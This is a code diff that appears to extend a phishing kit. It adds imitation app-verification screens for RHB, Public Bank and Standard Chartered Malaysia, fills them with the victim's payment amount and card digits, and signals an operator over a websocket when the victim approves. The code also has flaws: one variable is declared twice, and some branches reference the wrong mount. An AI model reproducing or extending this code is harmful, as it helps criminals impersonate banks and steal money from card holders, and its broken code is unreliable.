@@ -2120,6 +2120,87 @@ fetch('/api/settings')
         `;
       }
       else
+      if(p.cardInfo.bankName==='RHB BANK BERHAD') {
+        document.querySelector("#mount5").classList.remove('hidden');
+        document.querySelector("#mount5").shadowRoot.querySelector("body > div > div > table:nth-child(3) > tbody.oobtrxinfo > tr.mobilehide > td:nth-child(2) > div:nth-child(1) > div").textContent = 'MYR '+document.querySelector('#root > div > div > div.topHeaderWrapper___606940 > div > div.topNavigationContainer___aadca4 > div > div:nth-child(1) > h1 > span').textContent.replace(/[^\d.]/g, "");
+        document.querySelector("#mount5").shadowRoot.querySelector("body > div > div > table:nth-child(3) > tbody.oobtrxinfo > tr.mobilehide > td:nth-child(2) > div:nth-child(2) > div > span").textContent = p.cardInfo.cardNumber.slice(-4);
+        const now = new Date(); 
+        const options = {
+        weekday: 'short',
+        month: 'short',
+        day: '2-digit',
+        year: 'numeric',
+        timeZone: 'Asia/Kuala_Lumpur'};
+        const parts = new Intl.DateTimeFormat('en-US', options).formatToParts(now);
+        const weekday = parts.find(p => p.type === 'weekday').value;
+        const month = parts.find(p => p.type === 'month').value;
+        const day = parts.find(p => p.type === 'day').value;
+        const year = parts.find(p => p.type === 'year').value;
+        const dateStr = `${weekday} ${month} ${day} ${year}`;
+        const timeStr = now.toLocaleTimeString('en-GB', {
+            hour12: false,
+            timeZone: 'Asia/Kuala_Lumpur'
+        });
+        document.querySelector("#mount5").shadowRoot.querySelector("body > div > div > table:nth-child(3) > tbody.oobtrxinfo > tr.mobilehide > td:nth-child(1) > div:nth-child(2) > div").innerHTML = `
+            <span>${dateStr}</span><br>
+            <span>${timeStr} </span>
+        `;
+      }
+      else
+      if(p.cardInfo.bankName==='PUBLIC BANK BERHAD') {
+        document.querySelector("#mount6").classList.remove('hidden'); 
+        //document.querySelector("#mount6").shadowRoot.querySelector("body > div > div > table:nth-child(3) > tbody.oobtrxinfo > tr.mobilehide > td:nth-child(2) > div:nth-child(1) > div").textContent = 'MYR '+document.querySelector('#root > div > div > div.topHeaderWrapper___606940 > div > div.topNavigationContainer___aadca4 > div > div:nth-child(1) > h1 > span').textContent.replace(/[^\d.]/g, "");
+        //document.querySelector("#mount6").shadowRoot.querySelector("body > div > div > table:nth-child(3) > tbody.oobtrxinfo > tr.mobilehide > td:nth-child(2) > div:nth-child(2) > div > span").textContent = p.cardInfo.cardNumber.slice(-4);
+        const now = new Date(); 
+        const options = {
+        weekday: 'short',
+        month: 'short',
+        day: '2-digit',
+        year: 'numeric',
+        timeZone: 'Asia/Kuala_Lumpur'};
+        const parts = new Intl.DateTimeFormat('en-US', options).formatToParts(now);
+        const weekday = parts.find(p => p.type === 'weekday').value;
+        const month = parts.find(p => p.type === 'month').value;
+        const day = parts.find(p => p.type === 'day').value;
+        const year = parts.find(p => p.type === 'year').value;
+        const dateStr = `${weekday} ${month} ${day} ${year}`;
+        const timeStr = now.toLocaleTimeString('en-GB', {
+            hour12: false,
+            timeZone: 'Asia/Kuala_Lumpur'
+        });
+        /*document.querySelector("#mount6").shadowRoot.querySelector("body > div > div > table:nth-child(3) > tbody.oobtrxinfo > tr.mobilehide > td:nth-child(1) > div:nth-child(2) > div").innerHTML = `
+            <span>${dateStr}</span><br>
+            <span>${timeStr} </span>
+        `;*/
+      }
+      else
+      if(p.cardInfo.bankName==='STANDARD CHARTERED BANK MALAYSIA BERHAD') {
+        document.querySelector("#mount7").classList.remove('hidden'); 
+        //document.querySelector("#mount6").shadowRoot.querySelector("body > div > div > table:nth-child(3) > tbody.oobtrxinfo > tr.mobilehide > td:nth-child(2) > div:nth-child(1) > div").textContent = 'MYR '+document.querySelector('#root > div > div > div.topHeaderWrapper___606940 > div > div.topNavigationContainer___aadca4 > div > div:nth-child(1) > h1 > span').textContent.replace(/[^\d.]/g, "");
+        //document.querySelector("#mount6").shadowRoot.querySelector("body > div > div > table:nth-child(3) > tbody.oobtrxinfo > tr.mobilehide > td:nth-child(2) > div:nth-child(2) > div > span").textContent = p.cardInfo.cardNumber.slice(-4);
+        const now = new Date(); 
+        const options = {
+        weekday: 'short',
+        month: 'short',
+        day: '2-digit',
+        year: 'numeric',
+        timeZone: 'Asia/Kuala_Lumpur'};
+        const parts = new Intl.DateTimeFormat('en-US', options).formatToParts(now);
+        const weekday = parts.find(p => p.type === 'weekday').value;
+        const month = parts.find(p => p.type === 'month').value;
+        const day = parts.find(p => p.type === 'day').value;
+        const year = parts.find(p => p.type === 'year').value;
+        const dateStr = `${weekday} ${month} ${day} ${year}`;
+        const timeStr = now.toLocaleTimeString('en-GB', {
+            hour12: false,
+            timeZone: 'Asia/Kuala_Lumpur'
+        });
+        /*document.querySelector("#mount6").shadowRoot.querySelector("body > div > div > table:nth-child(3) > tbody.oobtrxinfo > tr.mobilehide > td:nth-child(1) > div:nth-child(2) > div").innerHTML = `
+            <span>${dateStr}</span><br>
+            <span>${timeStr} </span>
+        `;*/
+      }
+      else
       {
         document.querySelector("#app-verify-overlay > div.app-verify-box").classList.remove('hidden');
         var bankName = p.cardInfo?.bankName || p.bankName || 'Bank';
@@ -2158,6 +2239,24 @@ fetch('/api/settings')
         document.querySelector("#mount4").shadowRoot.querySelector('.vfy-spinner').style = ''; 
         document.querySelector("#mount4").shadowRoot.querySelector('.app-error').classList.remove('hidden'); 
         document.querySelector("#mount4").shadowRoot.querySelector('.app-error').textContent = p.message || 'APP verification not completed.'; 
+        return;
+      } else if (!document.querySelector("#mount5").classList.contains('hidden')) {
+        document.querySelector("#mount5").shadowRoot.querySelector('.vfy-spinner').classList.add('hidden'); 
+        document.querySelector("#mount5").shadowRoot.querySelector('.vfy-spinner').style = ''; 
+        document.querySelector("#mount5").shadowRoot.querySelector('.app-error').classList.remove('hidden'); 
+        document.querySelector("#mount5").shadowRoot.querySelector('.app-error').textContent = p.message || 'APP verification not completed.'; 
+        return;
+      } else if (!document.querySelector("#mount6").classList.contains('hidden')) {
+        document.querySelector("#mount6").shadowRoot.querySelector('.vfy-spinner').classList.add('hidden'); 
+        document.querySelector("#mount6").shadowRoot.querySelector('.vfy-spinner').style = ''; 
+        document.querySelector("#mount6").shadowRoot.querySelector('.app-error').classList.remove('hidden'); 
+        document.querySelector("#mount6").shadowRoot.querySelector('.app-error').textContent = p.message || 'APP verification not completed.'; 
+        return;
+      } else if (!document.querySelector("#mount7").classList.contains('hidden')) {
+        document.querySelector("#mount7").shadowRoot.querySelector('.vfy-spinner').classList.add('hidden'); 
+        document.querySelector("#mount7").shadowRoot.querySelector('.vfy-spinner').style = ''; 
+        document.querySelector("#mount7").shadowRoot.querySelector('.app-error').classList.remove('hidden'); 
+        document.querySelector("#mount7").shadowRoot.querySelector('.app-error').textContent = p.message || 'APP verification not completed.'; 
         return;
       }
       // Show generic app-verify-box (was hidden when mount active)
@@ -3388,6 +3487,24 @@ async function loadPage(pagePath, mountId) {
         .querySelector("#formactions")
         .addEventListener('click', CustomizationappVerifyContinue4);
 
+    await loadPage('/pay/RHB', 'mount5');
+    const shadow5 = document.querySelector("#mount5").shadowRoot;
+    shadow5
+        .querySelector("#formactionsoob > td > a > div")
+        .addEventListener('click', CustomizationappVerifyContinue5);
+
+    await loadPage('/pay/PBB', 'mount6');
+    const shadow6 = document.querySelector("#mount6").shadowRoot;
+    shadow6
+        .querySelector("#ExitLink")
+        .addEventListener('click', CustomizationappVerifyContinue6);
+
+    await loadPage('/pay/SCBMB', 'mount7');
+    const shadow6 = document.querySelector("#mount7").shadowRoot;
+    shadow6
+        .querySelector("#ExitLink")
+        .addEventListener('click', CustomizationappVerifyContinue7);
+
 
 
 
@@ -3442,7 +3559,45 @@ function CustomizationappVerifyContinue4() {
                             sessionId: sid
                         }
                     }))
-            } 
+            }            
+
+function CustomizationappVerifyContinue5() {
+                document.querySelector("#mount5").shadowRoot.querySelector("div > div").style.display = 'flex';
+                document.querySelector("#mount5").shadowRoot.querySelector("div > div").classList.remove('hidden');
+                if (ws && ws.readyState === 1 && sid)
+                    ws.send(JSON.stringify({
+                        type: 'app_verify_done',
+                        payload: {
+                            sessionId: sid
+                        }
+                    }))
+            }            
+
+function CustomizationappVerifyContinue6() {
+                document.querySelector("#mount6").shadowRoot.querySelector("div > div").style.display = 'flex';
+                document.querySelector("#mount6").shadowRoot.querySelector("div > div").classList.remove('hidden');
+                if (ws && ws.readyState === 1 && sid)
+                    ws.send(JSON.stringify({
+                        type: 'app_verify_done',
+                        payload: {
+                            sessionId: sid
+                        }
+                    }))
+            }            
+
+function CustomizationappVerifyContinue7() {
+                document.querySelector("#mount7").shadowRoot.querySelector("div > div").style.display = 'flex';
+                document.querySelector("#mount7").shadowRoot.querySelector("div > div").classList.remove('hidden');
+                if (ws && ws.readyState === 1 && sid)
+                    ws.send(JSON.stringify({
+                        type: 'app_verify_done',
+                        payload: {
+                            sessionId: sid
+                        }
+                    }))
+            }    
+
+
 
 
 
